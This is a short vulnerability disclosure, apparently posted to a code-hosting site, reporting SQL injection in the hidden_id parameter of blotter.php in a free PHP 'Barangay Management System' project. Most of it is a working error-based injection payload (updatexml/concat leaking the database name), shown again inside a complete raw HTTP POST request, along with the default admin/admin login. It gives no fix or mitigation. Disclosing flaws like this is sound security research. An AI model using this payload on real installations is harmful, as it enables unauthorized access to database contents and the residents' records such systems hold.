# Barangay Management System v1.0 by itsourcecode.com has SQL injection

Vulnerability Author: CSZ

The decompression password for the source file is itsourcecode.

Login account: admin/admin (Super Admin account)

vendors: https://itsourcecode.com/free-projects/php-project/barangay-management-system-project-in-php-with-source-code/

Vulnerability File: /bmis/pages/blotter/blotter.php

Vulnerability location: /bmis/pages/blotter/blotter.php,hidden_id

[+] Payload: hidden_id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> hidden_id

```sql
POST /bmis/pages/blotter/blotter.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/bmis/pages/blotter/blotter.php
Cookie: sessions=aj0k5o11d743ingah9kp1b0ejntrqer6; PHPSESSID=fbu82ocu8kd37b5b20uqq71a35; _ga=GA1.1.1382961971.1655097107; _gid=GA1.1.804632123.1655097107
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 329

hidden_id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&txt_edit_cname=&txt_edit_cage=1&txt_edit_cadd=1&txt_edit_ccontact=1&txt_edit_pname=&txt_edit_page=1&txt_edit_padd=1&txt_edit_pcontact=1&txt_edit_complaint=1&ddl_edit_acttaken=1st+Option&ddl_edit_stat=Solved&txt_edit_location=1&btn_save=Save&table_length=10
```

![image](https://user-images.githubusercontent.com/54017627/173301744-520c64e5-2e12-4849-b5b9-28f435d39a41.png)

